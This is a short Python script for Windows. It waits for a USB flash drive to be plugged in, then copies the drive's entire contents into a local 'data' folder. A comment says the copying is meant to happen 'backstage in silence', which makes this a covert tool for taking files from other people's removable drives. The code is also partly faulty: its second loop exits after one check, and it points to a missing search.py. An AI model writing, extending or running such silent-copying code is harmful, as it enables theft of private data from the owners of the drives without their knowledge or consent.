import os
import time
from datetime import datetime
import shutil
from win32 import win32file

sign_1 = False


def Saviour():
    """Main program"""
    
    global sign_1

    """Drive list"""
    hard_disk=[]
    hard_disk_all=["A:/", "B:/","C:/","D:/","E:/","F:/","G:/","H:/","I:/",
               "J:/","K:/","L:/","M:/","N:/","O:/","P:/","Q:/","R:/",
               "S:/","T:/","U:/","V:/","W:/","X:/","Y:/","Z:/"]

    a = True

    """Loop traversal to achieve every scan with a 5 seconds break to find out whether there is a new portable disk access"""
    while (a == True):
        for i in range(26):
            if win32file.GetDriveType(hard_disk_all[i]) == 2:
                hard_disk.append(hard_disk_all[i])
        if len(hard_disk) > 0:
            a = False
        else:
            time.sleep(5)

    """Path of the USB flash equipment"""
    usb_path = hard_disk[0]

    """Path of the destination folder"""
    save_path = "data"

    """Keep in the loop, until the new portable disk has been detected"""
    b = True

    """Keep in the loop oof detecting, meanwhile, copy every target file in the system backstage in silence(which defined in search.py)"""
    while (b == True):
        if os.path.exists(usb_path):
            shutil.copytree(usb_path, save_path)
            sign_1 = True
            break
        else:
            time.sleep(3)
            break
